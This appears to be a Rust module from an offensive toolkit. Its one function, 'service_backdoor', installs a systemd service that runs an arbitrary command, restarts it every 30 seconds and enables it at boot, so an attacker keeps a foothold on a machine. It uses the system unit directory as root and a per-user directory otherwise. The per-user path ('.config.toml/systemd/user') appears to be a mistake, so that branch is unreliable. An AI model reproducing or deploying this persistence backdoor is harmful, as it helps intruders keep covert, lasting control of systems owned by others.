use nix::libc::user;
use nix::unistd::Uid;
use crate::ui::{print_status, print_success};

pub fn service_backdoor(name: String, command: String) {
    let root= Uid::effective().is_root();
    let username = whoami::username();
    let path = match root {
        true => format!("/etc/systemd/system/{name}.service"),
        false => format!("/home/{username}/.config.toml/systemd/user/{name}.service")
    };

    let content = format!("[Unit]\n\
                                  Description={name}\n\n\
                                  [Service]\n\
                                  ExecStart={command}\n\
                                  Restart=always\n\
                                  RestartSec=30\n\n\
                                  [Install]\n\
                                  WantedBy=default.target");

    std::fs::write(path.clone(), content).expect("Failed to write service file");
    print_status(format!("Service file written to {path}"));

    if root {
        std::process::Command::new("systemctl")
            .arg("enable")
            .arg(format!("{name}.service"))
            .output()
            .expect("Failed to enable service");
        std::process::Command::new("systemctl")
            .arg("start")
            .arg(format!("{name}.service"))
            .output()
            .expect("Failed to start service");
    } else {
        std::process::Command::new("systemctl")
            .arg("--user")
            .arg("enable")
            .arg(format!("{name}.service"))
            .output()
            .expect("Failed to enable service");
        std::process::Command::new("systemctl")
            .arg("--user")
            .arg("start")
            .arg(format!("{name}.service"))
            .output()
            .expect("Failed to start service");
    }
    print_success("Started persistence service");
}